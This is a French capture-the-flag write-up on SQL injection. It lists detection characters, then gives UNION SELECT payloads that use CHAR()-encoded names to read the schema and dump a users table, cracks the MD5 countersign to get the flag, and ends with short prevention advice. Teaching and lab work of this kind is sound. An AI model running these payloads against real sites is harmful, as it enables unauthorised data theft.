# Nom de la faille
Injection SQL

## Définition
Les injections SQL sont une technique utilisée par des utilisateurs malveillants pour manipuler les requêtes SQL envoyées par une application web à sa base de données.

## Risques
Les injections SQL présentent plusieurs risques majeurs pour la sécurité des applications web :

- **Accès non autorisé aux données**
- **Modification des données**
- **Exécution de commandes**
- **Déni de service**

## Détection et Exploitation

### Détection
1. **Test des entrées utilisateur** :
   - Ajoutez des payloads spécifiques après le nom d'utilisateur pour voir si cela provoque des erreurs ou modifie le comportement de la page. Exemples de payloads : `'`, `"`, `#`, `;`, `)`.
   - Exemple : `1 OR 1=1` peut afficher une erreur et révéler la requête SQL dans l'URL.

2. **Analyse des erreurs** :
   - Observez les messages d'erreur retournés par l'application. Les erreurs SQL peuvent révéler des informations sur la structure de la base de données et les requêtes utilisées.

### Exploitation

1. **Trouver le nombre de champs** :
   - Utilisez `ORDER BY` pour déterminer le nombre de champs dans la requête. Par exemple, `1 ORDER BY 2` peut renvoyer une erreur si le champ n'existe pas.
   - Une fois le nombre de champs déterminé, utilisez `UNION SELECT` pour extraire des informations. Par exemple, `1 UNION SELECT 1, 2` pour vérifier le nombre de champs.

2. **Extraire des informations**

   - **Obtenir le nom de la base de données** :
     - Utilisez la requête `1 UNION SELECT 1, database()` pour obtenir le nom de la base de données actuelle.
     - Exemple de résultat : `Member_Sql_Injection`.

   - **Obtenir les noms des tables** :
     - Utilisez la requête `1 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)` pour obtenir les noms des tables dans la base de données.
     - Exemple de résultat : `users`.

   - **Obtenir les noms des colonnes** :
     - Utilisez la requête `1 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110) AND TABLE_NAME = CHAR(117,115,101,114,115)` pour obtenir les noms des colonnes de la table `users`.
     - Exemple de résultat : `me, user_id, first_name, last_name, town, country, planet, Commentaire, countersign`.

   - **décryptage du flag** :
     - Utilisez la requête `1 UNION SELECT 1, Commentaire FROM users` pour obtenir un indice de décryptage.
       - Exemple de résultat : `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`.
     - Utilisez la requête `1 UNION SELECT 1, countersign FROM users LIMIT 1 OFFSET 4` pour obtenir la contre-signature à décrypter.
       - Exemple de résultat : `5ff9d0165b4f92b14994e5c685cdce28`.
     - Décryptez le mot de passe en utilisant un outil de décryptage MD5, comme [dcode.fr](https://www.dcode.fr/md5-hash).
       - Exemple de résultat : `FortyTwo`.
     - Convertissez le mot de passe en minuscules : `fortytwo`.
     - Appliquez la fonction de hachage SHA-256 [encrypteur sha-256](https://10015.io/tools/sha256-encrypt-decrypt) au mot de passe en minuscules pour obtenir le résultat final.
       - Flag obtenu: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`.

## Comment l'éviter

1. **Utiliser des requêtes préparées**
2. **Valider et échapper les entrées utilisateur**
3. **Utiliser des frameworks sécurisés**

## Source
- https://www.vaadata.com/blog/fr/injections-sql-principes-impacts-exploitations-bonnes-pratiques-securite/
- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/
- https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/
- https://www.w3schools.com/sql/sql_injection.asp
